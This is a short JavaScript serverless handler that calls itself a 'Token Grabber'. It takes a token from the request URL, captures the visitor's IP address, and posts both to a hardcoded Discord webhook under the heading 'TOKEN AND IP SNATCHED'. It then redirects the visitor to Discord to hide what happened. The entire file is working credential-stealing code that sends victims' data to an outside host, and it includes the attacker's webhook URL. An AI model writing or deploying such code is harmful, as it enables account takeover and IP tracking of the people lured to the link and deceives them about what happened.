export default async function handler(req, res) {
    // Get the token from the URL query: ?token=XYZ
    const { token } = req.query;

    if (token) {
        // Get IP (Vercel provides this in headers)
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const params = {
            username: "Token Grabber",
            embeds: [{
                title: "TOKEN AND IP SNATCHED",
                color: 15258703,
                fields: [
                    { name: "IP ADDRESS", value: `${ip}`, inline: true },
                    { name: "TOKEN", value: `${token}`, inline: true }
                ]
            }]
        };

        // Send to Discord
        await fetch('https://discord.com/api/webhooks/1485249194544463872/Ad_jTePNrePFXt_vONneY44F25OG1Lp9gQjxoSDK9Q2Z9CbXcwimNDZaCScPwZ2ckn8_', {
            method: "POST",
            headers: { 'Content-type': 'application/json' },
            body: JSON.stringify(params)
        });
    }

    // Redirect the user
    res.redirect(302, 'https://discord.com/channels/@me');
}